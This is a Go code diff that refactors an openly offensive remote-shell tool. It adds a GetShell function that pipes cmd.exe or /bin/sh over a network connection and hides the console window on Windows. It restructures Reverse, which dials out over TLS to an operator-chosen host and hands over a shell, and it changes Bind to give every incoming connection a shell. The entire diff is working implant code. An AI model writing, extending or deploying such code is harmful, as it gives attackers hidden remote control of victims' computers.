@@ -17,6 +17,7 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"syscall"
 	"time"
 )
 
@@ -32,6 +33,21 @@ var (
 	connType      string
 )
 
+func GetShell(conn net.Conn) {
+	var cmd *exec.Cmd
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.Command("cmd.exe")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	default:
+		cmd = exec.Command("/bin/sh")
+	}
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Stdin = conn
+	cmd.Run()
+}
+
 func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 	valid := false
 	connState := conn.ConnectionState()
@@ -42,35 +58,6 @@ func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 		}
 	}
 	return valid, nil
-}
-
-func Reverse(connectString string, fingerprint []byte) {
-	var (
-		cmd  *exec.Cmd
-		conn *tls.Conn
-		err  error
-	)
-	config := &tls.Config{InsecureSkipVerify: true}
-	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
-		os.Exit(ERR_HOST_UNREACHABLE)
-	}
-
-	defer conn.Close()
-
-	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
-		os.Exit(ERR_BAD_FINGERPRINT)
-	}
-
-	switch runtime.GOOS {
-	case "windows":
-		cmd = exec.Command("cmd.exe")
-	default:
-		cmd = exec.Command("/bin/sh")
-	}
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Stdin = conn
-	cmd.Run()
 }
 
 func GenerateCert() tls.Certificate {
@@ -119,21 +106,23 @@ func GenerateCert() tls.Certificate {
 	return certificate
 }
 
-func HandleConnection(conn net.Conn) {
+func Reverse(connectString string, fingerprint []byte) {
 	var (
-		cmd *exec.Cmd
+		cmd  *exec.Cmd
+		conn *tls.Conn
+		err  error
 	)
-
-	switch runtime.GOOS {
-	case "windows":
-		cmd = exec.Command("cmd.exe")
-	default:
-		cmd = exec.Command("/bin/sh")
+	config := &tls.Config{InsecureSkipVerify: true}
+	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
+		os.Exit(ERR_HOST_UNREACHABLE)
 	}
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Stdin = conn
-	cmd.Run()
+
+	defer conn.Close()
+
+	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
+		os.Exit(ERR_BAD_FINGERPRINT)
+	}
+	GetShell(conn)
 }
 
 func Bind(addr string) {
@@ -149,7 +138,7 @@ func Bind(addr string) {
 		if err != nil {
 			continue
 		}
-		go HandleConnection(conn)
+		go GetShell(conn)
 	}
 }
 
